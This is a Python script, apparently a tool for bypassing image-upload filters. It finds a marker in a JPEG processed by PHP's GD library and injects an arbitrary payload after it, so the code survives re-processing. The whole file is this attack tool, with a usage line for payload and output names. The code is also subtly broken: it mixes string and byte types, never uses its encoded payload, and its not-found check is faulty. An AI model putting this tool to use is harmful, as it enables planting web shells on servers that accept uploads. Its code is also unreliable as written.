#!/usr/bin/python
import sys
import binascii
import os

magic_number = "03010002110311003f00" 

def main():

    if len(sys.argv) != 4:
        print("USAGE: <gd-jpeg> <payload> <output_name>")
        sys.exit()

    jpeg = sys.argv[1]
    payload = sys.argv[2]
    output = sys.argv[3]

    loc = find_injection_start_index(jpeg)
    inject_payload(jpeg, loc, payload, output)

def find_injection_start_index(jpeg):

    print("Searching for magic number...")
    f = open(jpeg, 'rb')
    contents = f.read()
    loc = contents.find(binascii.unhexlify(magic_number))
    f.close()
    
    if loc:
        print("Found magic number.")
        return loc + len(binascii.unhexlify(magic_number))
    else:
        print("Magic number not found. Exiting.")
        sys.exit()

def inject_payload(jpeg, loc, payload, output):

    bin_payload = bytes(payload, 'utf-8')

    f = open(jpeg, 'rb')
    fo = open(output, 'wb')
    
    print("Injecting payload...")
    contents = f.read()
    pre_payload = contents[:loc]
    post_payload = contents[loc + len(payload):]
    fo.write(pre_payload + payload + post_payload + '\n')
    print("Payload written.")

    f.close()
    fo.close()

if __name__ == "__main__":
    main()
